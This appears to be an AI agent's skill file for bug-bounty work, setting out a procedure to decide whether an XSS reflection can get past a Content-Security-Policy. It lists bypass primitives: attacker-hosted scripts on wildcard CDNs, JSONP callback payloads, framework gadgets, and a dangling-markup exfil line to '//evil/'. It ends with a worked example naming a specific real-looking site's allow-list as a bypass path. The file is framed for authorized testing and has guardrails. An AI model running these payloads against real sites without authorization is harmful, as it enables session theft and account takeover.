---
name: hunt-csp-bypass
description: "Decide whether a reflected/stored injection still executes despite a Content-Security-Policy, and how. Covers injection-context triage, script-src classification (unsafe-inline / strict-dynamic / nonce+host-allowlist), and the real bypass primitives — publishable wildcard CDNs (*.cloudfront.net, *.s3.amazonaws.com, *.storage.googleapis.com, *.azureedge.net), JSONP/callback on an allow-listed host, AngularJS/Vue gadgets, missing base-uri/object-src, and dangling-markup exfil when script is truly blocked. Use AFTER hunt-xss/hunt-dom finds a reflection that a CSP appears to neutralise, whenever a response carries a Content-Security-Policy header/meta, or when a reflected param looks dead only because of CSP. A strict CSP is a MAYBE, not an automatic false positive — but prove execution in a real browser before claiming anything."
---

# HUNT-CSP-BYPASS — turning a CSP-"mitigated" reflection into proof (or an honest disprove)

A reflected/stored injection behind a strict CSP is a **MAYBE**, not an automatic FP, and
not an automatic win either. This skill is the decision procedure. It assumes you already
have an injection point (from `hunt-xss` / `hunt-dom`); CSP only decides whether it RUNS.

## 0. Prerequisite — confirm the injection context FIRST (a dead context makes CSP moot)

Reflect a unique numeric canary and read what survives UNENCODED at the sink:
- `<` `>` survive in the HTML body → you can inject a TAG → CSP now matters, go to §1.
- Attribute context only (`"`/`'` encoded) → try attribute breakout / event handler;
  if both quotes are encoded, usually dead regardless of CSP.
- Inside a `<script>` JS string → string/template breakout; CSP for inline is moot if the
  original inline block is nonce'd (you're already inside an allowed script).
- Fully entity-encoded everywhere → **FP. Stop. Do not open a CSP rabbit hole.**

You cannot bypass a CSP into existence — no tag injection, no XSS.

## 1. Read the CSP OF THAT EXACT RESPONSE (header or <meta>), not a different page's

Pages differ; an API 200 and the SPA shell often carry different policies, and
`Content-Security-Policy-Report-Only` does NOT block anything (treat as absent).
Extract and classify `script-src` (fall back to `default-src`):

| script-src shape | verdict |
|---|---|
| absent, or contains `'unsafe-inline'` (and no nonce/hash overriding it) | plain XSS — inject `<script>`/handler, prove, report |
| `'strict-dynamic'` present | host/`'self'` allow-list is IGNORED by modern browsers → you need a trusted script-GADGET already on the page; host-based bypass won't work |
| nonce/hash + host allow-list, NO `'unsafe-inline'`, NO `'strict-dynamic'` | the host allow-list is LIVE → §2 for a bypass primitive |
| `'self'` only, no usable hosts, no gadgets | likely mitigated → §3 fallbacks, else disprove |

Notes that flip the verdict:
- `'unsafe-inline'` is cancelled when a nonce or hash is also present (browsers ignore
  `'unsafe-inline'` then) — don't celebrate an `'unsafe-inline'` that sits next to a nonce.
- Missing `base-uri` + an injected `<base href>` can redirect relative script src → bypass.
- Missing `object-src 'none'` can allow `<object data=...>`/plugin-based execution on old stacks.

## 2. Bypass primitives when a HOST ALLOW-LIST is live (still need §0 tag injection)

Walk the allow-listed hosts; any ONE of these is a bypass:

1. **Publishable wildcard CDNs** — you can host your own JS there, so a `src=` to them passes:
   `*.cloudfront.net`, `*.s3.amazonaws.com`, `*.storage.googleapis.com`,
   `*.azureedge.net`, `*.web.core.windows.net`, `*.firebaseapp.com`, `*.pages.dev`,
   `*.github.io`. Stand up YOUR OWN bucket/distribution, load
   `<script src="https://<yours>.cloudfront.net/x.js">`.
2. **JSONP / callback endpoints on an allow-listed host** (`?callback=`, `?jsonp=`, `?cb=`):
   `<script src="https://allowed.host/api?callback=alert(document.domain)">`. Google's
   `accounts.google.com`/`*.googleapis.com` and many analytics/IR vendors expose these.
3. **Known gadget libraries on an allow-listed host**: AngularJS < 1.8 (`ng-app` CSP
   template-injection gadgets), older Vue, or any lib with a documented CSP gadget.
4. **`'unsafe-eval'` present + a sink that reaches eval/Function** (template engines) →
   gadget-based execution.
5. **Open redirect on an allow-listed origin** that lands on attacker JS (allow-list follows
   the request, not the final host, only on some engines — test it).

If none apply → the CSP genuinely mitigates script execution → go to §3.

## 3. When script is truly blocked — downgrade, don't inflate

- **Dangling-markup / CSS exfiltration**: if `img-src`/`style-src`/`connect-src` are loose,
  an unclosed `<img src='//evil/?` or injected CSS can exfil CSRF tokens / secrets from the
  DOM without running a script. Impact is narrower (data leak, not full XSS) — report as such.
- **Otherwise it is a §5e DISPROVE.** Say so plainly: "reflects unencoded, but
  `script-src` (nonce + allow-list, no unsafe-inline/strict-dynamic, no publishable host)
  blocks execution; no bypass found." A precise disprove beats a false "XSS".

## 4. PROOF (never claim without this)

Execution MUST be demonstrated in a REAL browser (built-in browser / Playwright), not inferred:
- Load the crafted URL, show `alert(document.domain)` firing (or a DOM write) with the
  in-scope host as `document.domain`.
- Capture the request/response showing the reflection + the CSP that you bypassed.
- A CSP bypass that makes a "mitigated" reflection fire IS the finding — document the exact
  allow-listed host / primitive you used.

## 5. Report & severity (make it pay — see HUNT_GUIDE §7)

- Confirmed reflected XSS ≈ Bugcrowd **VRT P3** on its own.
- **P2** when chained to real impact on an authenticated/sensitive origin: session/cookie
  theft, CSRF-token exfil, or an account-takeover action performed as the victim.
- In the report, name the CSP you defeated and the exact bypass primitive (e.g.
  "`script-src` allow-lists `*.cloudfront.net`; hosted JS on an attacker CloudFront dist").
  That specificity is the difference between a paid P3/P2 and a closed N/A.
- Mask PII per `evidence-hygiene`. Claim only what you proved.

## 6. Guardrails

- Authorized, in-scope targets only. Prove with the lightest action; a single
  `alert(document.domain)` / benign DOM read is enough — do not pivot to real data theft.
- Remove any infrastructure you stood up for the PoC (bucket/distribution) afterward.
- Read-only otherwise; no state-changing actions as another user.

## Worked example on file

`investors.delltechnologies.com` reflects `action` / `filenum` / `v`, and its `script-src`
carries a nonce + a host allow-list that INCLUDES `*.cloudfront.net` and
`qmod.quotemedia.com`. So IF §0 yields HTML-tag injection, that allow-list (publishable
CloudFront, or a quotemedia JSONP) is the bypass path. Confirm §0 by hand before claiming.
